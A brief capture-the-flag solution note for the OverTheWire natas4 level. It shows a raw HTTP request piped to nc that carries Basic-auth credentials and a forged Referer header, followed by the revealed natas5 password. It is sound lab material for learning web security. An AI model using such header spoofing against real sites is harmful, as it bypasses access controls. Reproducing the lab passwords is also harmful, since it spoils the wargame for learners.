printf "GET /index.php HTTP/1.1\r\nHost: natas4.natas.labs.overthewire.org\r\nAuthorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va\r\nReferer: http://natas5.natas.labs.overthewire.org/\r\n\r\n" | nc 176.9.9.172 80


# Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq


# We need to include in the HTTP GET request the Referer as natas5
# Use Wireshark to capture the http request to see how it is done
